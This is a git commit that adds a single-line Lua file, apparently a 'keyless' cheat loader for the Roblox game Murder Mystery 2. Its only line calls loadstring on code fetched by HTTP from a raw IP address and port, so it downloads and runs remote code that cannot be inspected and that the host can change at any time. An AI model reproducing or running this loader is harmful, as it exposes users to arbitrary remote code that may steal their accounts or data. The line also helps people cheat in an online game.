9ef0cef1a809dc9d80ab07709e5f7516b797958b
mm2-keyless <jpronda87@gmail.com>
2026-01-12 22:49:49 +0800

    Create mm2.lua

---
+++ mm2.lua
@@ -0,0 +1,1 @@
+loadstring(game:HttpGet("http://109.71.240.235:3910/api/run/eyJpZCI6ImZmYTk4NzE5LWY2NTUtNDc5MC05ZjViLTEyZjdiYWQ3MmIwZSIsImtpbmQiOiJsb2FkZXIiLCJ2aXN1YWwiOnsiaWQiOiJtbTJldmVudCJ9fQ"))()
